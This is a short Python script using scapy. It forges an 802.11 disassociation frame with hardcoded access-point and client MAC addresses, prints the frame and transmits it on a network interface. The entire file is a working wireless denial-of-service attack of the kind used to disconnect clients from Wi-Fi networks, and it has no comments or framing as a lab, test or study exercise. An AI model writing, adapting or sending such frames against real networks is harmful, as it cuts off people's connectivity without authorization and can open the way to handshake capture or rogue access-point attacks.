from scapy.all import *


if __name__ == '__main__':

    disassociation_frame = Dot11(addr1="5c:aa:fd:97:c8:74", addr2="5c:aa:fd:97:c8:73", addr3="5c:aa:fd:97:c8:75") / Dot11Disas(reason=1)
    disassociation_frame.show()
    send(disassociation_frame, iface='en0', verbose=False)